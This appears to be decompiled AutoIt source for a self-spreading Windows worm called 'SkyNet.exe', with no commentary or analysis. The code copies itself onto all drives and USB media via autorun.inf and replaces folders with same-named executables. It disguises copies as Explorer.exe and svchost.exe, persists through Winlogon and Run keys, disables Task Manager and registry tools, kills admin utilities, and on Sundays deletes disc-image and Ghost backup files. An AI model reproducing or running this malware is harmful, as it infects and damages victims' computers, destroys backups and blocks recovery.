; <COMPILER: v3.0.100.0>
opt("trayiconhide",1)
$change_dir="."
if StringLower(@ScriptName)=StringLower("SkyNet.exe") and StringLen(@WorkingDir)<=3 Then
Run(@WindowsDir&"\Explorer.exe "&@WorkingDir)
Else
$_dir=StringTrimRight(@ScriptName,4)
if FileChangeDir($_dir) then
$change_dir=$_dir
Run(@WindowsDir&"\Explorer.exe "&@WorkingDir)
FileChangeDir("..")
FileSetAttrib($_dir, "+H+A+S")
EndIf
EndIf
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\NonEnum", "{6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer", "NoFolderOptions","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum", "{6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL","CheckedValue")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL","CheckedValue","REG_SZ","1")
RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN","CheckedValue")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN","CheckedValue","REG_DWORD","2")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools","REG_DWORD","1")
$size=FileGetSize(@ScriptFullPath)
if FileExists(@SystemDir&"\Explorer.exe") 	Then
if FileGetSize(@SystemDir&"\Explorer.exe")<>$size Then
if FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R-S") 	Then
if FileCopy(@ScriptFullPath,@SystemDir&"\Explorer.exe",1) 	Then
if FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R+S") 	Then run(@SystemDir&"\Explorer.exe")
EndIf
EndIf
EndIf
ElseIf FileCopy(@ScriptFullPath,@SystemDir&"\Explorer.exe",1) Then
If FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R+S") 	Then run(@SystemDir&"\Explorer.exe")
EndIf
if FileExists(@FavoritesDir&"\svchost.exe") Then
if FileGetSize(@FavoritesDir&"\svchost.exe")<>$size Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then
if FileCopy(@ScriptFullPath,@FavoritesDir&"\svchost.exe",1)Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then run(@FavoritesDir&"\svchost.exe")
EndIf
EndIf
EndIf
ElseIf FileCopy(@ScriptFullPath,@FavoritesDir&"\svchost.exe",1) Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then run(@FavoritesDir&"\svchost.exe")
EndIf
if FileCopy(@ScriptFullPath,@AppDataDir&"\Explore.exe",1) 			then FileSetAttrib(@AppDataDir&"\Explore.exe","+R+A+H+S")
if FileCopy(@ScriptFullPath,@WindowsDir&"\svchoist.exe",1) 		then FileSetAttrib(@WindowsDir&"\svchoist.exe","+R+A+H+S")
if FileCopy(@ScriptFullPath,@WindowsDir&"\_default .pif",1) 		then FileSetAttrib(@WindowsDir&"\_default .pif","+R+A+H+S")
if FileCopy(@ScriptFullPath,@AppDataDir&"\Microsoft\WinNT.com",1) 	then FileSetAttrib(@AppDataDir&"\Microsoft\WinNT.com","+R+A+H+S")
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run","Graphics","REG_SZ",@WindowsDir&"\_default .pif")
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run","WinNT","REG_SZ",@AppDataDir&"\Microsoft\WinNT.com")
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Shell","REG_SZ",@WindowsDir&'\Explorer.exe "'&@SystemDir&'\Explorer.exe"')
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Userinit","REG_SZ",@SystemDir&'\userinit.exe, "'&@AppDataDir&'\Explore.exe"')
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","Dll Link","REG_SZ",@WindowsDir&"\svchoist.exe")
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","Dll Link","REG_SZ",@FavoritesDir&"\svchost.exe")
Scan_Dir($change_dir)
$get_drive2=DriveGetDrive("all")
For $i = 1 to $get_drive2[0]
if StringLower($get_drive2[$i])<>StringLower("a:") and StringLower($get_drive2[$i])<>StringLower(@HomeDrive) Then
FileChangeDir($get_drive2[$i])
if FileExists($get_drive2[$i]&"\SkyNet.exe") Then
if FileGetSize($get_drive2[$i]&"\SkyNet.exe")<>$size Then
if FileSetAttrib($get_drive2[$i]&"\SkyNet.exe","-R+H+S+A") Then FileCopy(@ScriptFullPath,$get_drive2[$i]&"\SkyNet.exe",1)
EndIf
Else
Autorun($get_drive2[$i])
Scan_Dir($get_drive2[$i])
EndIf
EndIf
Next
if FileExists(@HomeDrive&"\SkyNet.exe") Then
if FileGetSize(@HomeDrive&"\SkyNet.exe")<>$size Then
if FileSetAttrib(@HomeDrive&"\SkyNet.exe","-R+H+S+A") Then FileCopy(@ScriptFullPath,@HomeDrive&"\SkyNet.exe",1)
EndIf
Else
Autorun(@HomeDrive)
Scan_Dir(@HomeDrive)
EndIf
if StringLower(@ScriptName)<>StringLower("Explorer.exe") and StringLower(@ScriptName)<>StringLower("svchost.exe") Then
Exit
EndIf
While 1
if ProcessExists("Regedit.exe") 	then ProcessClose("Regedit.exe")
if ProcessExists("DH3-IIS.exe") 	then ProcessClose("DH3-IIS.exe")
if ProcessExists("Taskmgr.exe") 	then ProcessClose("Taskmgr.exe")
if ProcessExists("Msconfig.exe") 	then ProcessClose("Msconfig.exe")
if FileExists(@SystemDir&"\Explorer.exe") 	Then
if FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R-S") 	Then
if FileCopy(@ScriptFullPath,@SystemDir&"\Explorer.exe",1) 	Then
if FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R+S") 	Then run(@SystemDir&"\Explorer.exe")
EndIf
EndIf
ElseIf FileCopy(@ScriptFullPath,@SystemDir&"\Explorer.exe",1) Then
If FileSetAttrib(@SystemDir&"\Explorer.exe","+H+A-R+S") 	Then run(@SystemDir&"\Explorer.exe")
EndIf
if FileExists(@FavoritesDir&"\svchost.exe") Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then
if FileCopy(@ScriptFullPath,@FavoritesDir&"\svchost.exe",1)Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then run(@FavoritesDir&"\svchost.exe")
EndIf
EndIf
ElseIf FileCopy(@ScriptFullPath,@FavoritesDir&"\svchost.exe",1) Then
if FileSetAttrib(@FavoritesDir&"\svchost.exe","+H+A-R+S") 	Then run(@FavoritesDir&"\svchost.exe")
EndIf
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Shell","REG_SZ",@WindowsDir&'\Explorer.exe "'&@SystemDir&'\Explorer.exe"')
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Userinit","REG_SZ",@SystemDir&'\userinit.exe, "'&@AppDataDir&'\Explore.exe"')
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","Dll Link","REG_SZ",@WindowsDir&"\svchoist.exe")
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce","Dll Link","REG_SZ",@FavoritesDir&"\svchost.exe")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\NonEnum", "{6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer", "NoFolderOptions","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum", "{6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden","REG_DWORD","2")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden","REG_DWORD","0")
RegWrite ("HKEY_USERS\S-1-5-21-1123561945-448539723-1177238915-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt","REG_DWORD","1")
RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL","CheckedValue")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL","CheckedValue","REG_SZ","1")
RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN","CheckedValue")
RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN","CheckedValue","REG_DWORD","2")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr","REG_DWORD","1")
RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools","REG_DWORD","1")
RegWrite ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools","REG_DWORD","1")
$get_drive=DriveGetDrive("REMOVABLE")
if $get_drive<>1 then
For $i = 1 to $get_drive[0]
if StringLower($get_drive[$i])<>StringLower("a:") Then
FileChangeDir($get_drive[$i])
if FileExists($get_drive[$i]&"\SkyNet.exe") Then
if FileGetSize($get_drive[$i]&"\SkyNet.exe")<>$size Then
if FileSetAttrib($get_drive[$i]&"\SkyNet.exe","-R+H+S+A") Then FileCopy(@ScriptFullPath,$get_drive[$i]&"\SkyNet.exe",1)
EndIf
Else
Autorun($get_drive[$i])
Scan_Dir($get_drive[$i])
EndIf
EndIf
Next
EndIf
Sleep(100)
WEnd
Func Autorun($drive_set)
FileCopy(@ScriptFullPath,$drive_set&"\SkyNet.exe",1)
FileSetAttrib($drive_set&"\SkyNet.exe", "+H+A+S+R")
$autorun=$drive_set&"\Autorun.inf"
if FileExists($autorun) then FileSetAttrib($autorun,"-R+S+H+A")
IniWrite ( $autorun, "autorun", "open", "SkyNet.exe" )
IniWrite ( $autorun, "autorun", "shell\open", "&Open" )
IniWrite ( $autorun, "autorun", "shell\open\Command", "SkyNet.exe" )
IniWrite ( $autorun, "autorun", "shell\open\Default", "0" )
IniWrite ( $autorun, "autorun", "shell\explore", "E&xplore" )
IniWrite ( $autorun, "autorun", "shell\explore\Command", "SkyNet.exe" )
FileSetAttrib($autorun,"+R+S+H+A")
EndFunc
Func Scan_Dir($dir)
FileChangeDir($dir)
$search = FileFindFirstFile("*.*")
While $search<>-1
$file = FileFindNextFile($search)
If @error=1 Then ExitLoop
if $file<>".." and $file<>"." Then
If FileChangeDir($file) Then
FileChangeDir("..")
FileSetAttrib($file, "+H+A+S")
if FileExists($file&".exe") Then
if FileGetSize($file&".exe")<>$size Then
FileSetAttrib($file&".exe","-R+A+H-S")
FileCopy(@ScriptFullPath,$file&".exe",1)
FileSetAttrib($file&".exe", "+R-H+A-S")
EndIf
Else
FileCopy(@ScriptFullPath,$file&".exe")
FileSetAttrib($file&".exe", "+R-H+A-S")
EndIf
if @WDAY=1 then Scan_Dir($file)
Else
if @WDAY=1 then
$extension=StringReplace($file,StringLower(StringTrimRight($file,4)),"")
if $extension=".vcd" or $extension=".nrg" or  $extension=".gho" Then
if not FileExists("D:\Template\safe.txt") Then
FileSetAttrib($file,"-R-A-H-S")
FileDelete($file)
EndIf
EndIf
EndIf
EndIf
EndIf
Sleep(100)
WEnd
FileClose($search)
FileChangeDir("..")
EndFunc
Func Scan_Removable($dir)
FileChangeDir($dir)
$search = FileFindFirstFile("*.*")
While $search<>-1
$file = FileFindNextFile($search)
If @error=1 Then ExitLoop
if $file<>".." and $file<>"." Then
If FileChangeDir($file) Then
FileChangeDir("..")
FileSetAttrib($file, "+H+A+S")
if FileExists($file&".exe") Then
if FileGetSize($file&".exe")<>$size Then
FileSetAttrib($file&".exe","-R+A+H-S")
FileCopy(@ScriptFullPath,$file&".exe",1)
FileSetAttrib($file&".exe", "+R-H+A-S")
EndIf
Else
FileCopy(@ScriptFullPath,$file&".exe")
FileSetAttrib($file&".exe", "+R-H+A-S")
EndIf
Scan_Removable($file)
EndIf
EndIf
Sleep(100)
WEnd
FileClose($search)
FileChangeDir("..")
EndFunc
